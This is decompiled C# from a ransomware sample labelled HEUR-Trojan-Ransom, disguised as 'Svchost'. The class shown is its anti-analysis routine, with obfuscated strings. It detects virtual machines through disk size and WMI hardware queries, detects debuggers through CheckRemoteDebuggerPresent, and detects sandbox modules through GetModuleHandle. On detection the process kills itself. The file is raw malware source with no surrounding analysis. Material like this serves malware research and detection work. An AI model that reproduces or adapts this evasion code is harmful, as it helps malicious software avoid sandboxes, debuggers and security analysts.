// Decompiled with JetBrains decompiler
// Type: sWduCclqEzKrM.QNNiaBjLhIIsGXT
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B0EDCE10-9F20-42C9-8790-E70D370F9841
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.Win32.Generic-9bf0633f41d2962ba5e2895ece2ef9fa7b546ada311ca30f330f0d261a7fb184.exe

using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace sWduCclqEzKrM
{
  internal sealed class QNNiaBjLhIIsGXT
  {
    [NonSerialized]
    internal static GetString \u001F;

    public static void FnyhSWIdjwAGKds()
    {
      if (QNNiaBjLhIIsGXT.dfCxfPUaXiT() || QNNiaBjLhIIsGXT.rWpPjNTrNfT() || QNNiaBjLhIIsGXT.GNiGCeJhZMbcys() || QNNiaBjLhIIsGXT.egTXtVWRIAePB() || QNNiaBjLhIIsGXT.vxDUpXaiUZcowC())
        Process.GetCurrentProcess().Kill();
      Environment.FailFast((string) null);
    }

    private static bool egTXtVWRIAePB()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool vxDUpXaiUZcowC()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains(QNNiaBjLhIIsGXT.\u001F(107380665)))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool dfCxfPUaXiT()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(QNNiaBjLhIIsGXT.\u001F(107380660)))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject[QNNiaBjLhIIsGXT.\u001F(107380643)].ToString().ToLower();
              if (lower == QNNiaBjLhIIsGXT.\u001F(107380082) && managementBaseObject[QNNiaBjLhIIsGXT.\u001F(107380053)].ToString().ToUpperInvariant().Contains(QNNiaBjLhIIsGXT.\u001F(107380044)) || lower.Contains(QNNiaBjLhIIsGXT.\u001F(107380063)) || managementBaseObject[QNNiaBjLhIIsGXT.\u001F(107380053)].ToString() == QNNiaBjLhIIsGXT.\u001F(107380022))
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private static bool rWpPjNTrNfT()
    {
      bool flag = false;
      try
      {
        QNNiaBjLhIIsGXT.UZsVnOJOnGOJ(Process.GetCurrentProcess().Handle, ref flag);
        return flag;
      }
      catch
      {
        return flag;
      }
    }

    private static bool GNiGCeJhZMbcys()
    {
      try
      {
        return QNNiaBjLhIIsGXT.koxgBoaGbXEGJu(QNNiaBjLhIIsGXT.\u001F(107380037)).ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    public static extern IntPtr koxgBoaGbXEGJu([In] string obj0);

    [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
    private static extern bool UZsVnOJOnGOJ([In] IntPtr obj0, [In] ref bool obj1);

    static QNNiaBjLhIIsGXT() => Strings.CreateGetStringDelegate(typeof (QNNiaBjLhIIsGXT));
  }
}
